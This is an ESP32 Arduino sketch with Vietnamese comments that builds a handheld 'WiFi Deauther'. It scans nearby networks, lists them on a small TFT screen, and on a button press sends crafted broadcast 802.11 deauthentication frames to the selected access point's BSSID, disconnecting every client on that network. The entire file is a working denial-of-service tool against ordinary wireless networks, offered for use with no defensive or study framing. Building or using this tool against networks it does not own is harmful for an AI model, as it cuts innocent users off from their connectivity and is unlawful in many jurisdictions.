#include <WiFi.h>
#include <TFT_eSPI.h>

// Cấu hình cho TFT_eSPI (cần thêm vào User_Setup.h trong thư viện TFT_eSPI)
TFT_eSPI tft = TFT_eSPI(); // Khởi tạo LCD

// Định nghĩa nút bấm
#define BUTTON_UP 32
#define BUTTON_DOWN 33
#define BUTTON_SELECT 23

// Biến toàn cục
int selectedNetwork = 0; // Mạng được chọn
int totalNetworks = 0;   // Tổng số mạng quét được
String networks[20];     // Lưu SSID (giới hạn 20 cho đơn giản)

// Hàm gửi packet deauth
void sendDeauth(String bssid_str, String client_str) {
  uint8_t deauth_pkt[26] = {
    0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00
  };

  uint8_t bssid[6], client[6];
  sscanf(bssid_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  sscanf(client_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &client[0], &client[1], &client[2], &client[3], &client[4], &client[5]);

  memcpy(&deauth_pkt[4], client, 6); // Receiver
  memcpy(&deauth_pkt[10], bssid, 6); // BSSID
  memcpy(&deauth_pkt[16], bssid, 6); // Source

  WiFi.mode(WIFI_STA);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Cần lấy channel từ scan
  esp_wifi_80211_tx(ESP_IF_WIFI_STA, deauth_pkt, sizeof(deauth_pkt), false);
}

// Hàm quét WiFi
void scanWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  totalNetworks = WiFi.scanNetworks();
  totalNetworks = min(totalNetworks, 20); // Giới hạn 20 mạng

  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(0, 0);
  tft.println("Networks found:");

  for (int i = 0; i < totalNetworks; i++) {
    networks[i] = WiFi.SSID(i) + " (" + WiFi.RSSI(i) + " dBm)";
    if (i == selectedNetwork) {
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.println("> " + networks[i]);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
    } else {
      tft.println("  " + networks[i]);
    }
  }
}

// Hàm hiển thị menu
void displayMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(0, 0);
  tft.println("WiFi Deauther");
  tft.println("1. Scan WiFi");
  tft.println("2. Deauth Selected");
  tft.println("Use Up/Down to select");
}

// Hàm xử lý nút bấm
int handleButtons() {
  if (digitalRead(BUTTON_UP) == LOW) {
    delay(200); // Debounce
    return 1;
  }
  if (digitalRead(BUTTON_DOWN) == LOW) {
    delay(200);
    return 2;
  }
  if (digitalRead(BUTTON_SELECT) == LOW) {
    delay(200);
    return 3;
  }
  return 0;
}

void setup() {
  Serial.begin(115200);

  // Khởi tạo LCD
  tft.init();
  tft.setRotation(3); // Xoay ngang cho 160x80
  tft.fillScreen(TFT_BLACK);

  // Cấu hình nút bấm
  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);

  // Hiển thị menu ban đầu
  displayMenu();
}

void loop() {
  int button = handleButtons();

  if (button == 1) { // Up
    selectedNetwork = max(0, selectedNetwork - 1);
    scanWiFi();
  }
  if (button == 2) { // Down
    selectedNetwork = min(totalNetworks - 1, selectedNetwork + 1);
    scanWiFi();
  }
  if (button == 3) { // Select
    if (totalNetworks == 0) {
      scanWiFi();
    } else {
      // Thực hiện deauth cho mạng được chọn
      String bssid = WiFi.BSSIDstr(selectedNetwork);
      String client = "FF:FF:FF:FF:FF:FF"; // Broadcast deauth
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0, 0);
      tft.println("Deauthing: " + WiFi.SSID(selectedNetwork));
      sendDeauth(bssid, client);
      delay(1000); // Gửi 10 lần
      for (int i = 0; i < 10; i++) {
        sendDeauth(bssid, client);
        delay(100);
      }
      tft.println("Done! Press Select to return");
      while (digitalRead(BUTTON_SELECT) == HIGH) {} // Chờ nhấn Select
      displayMenu();
    }
  }
}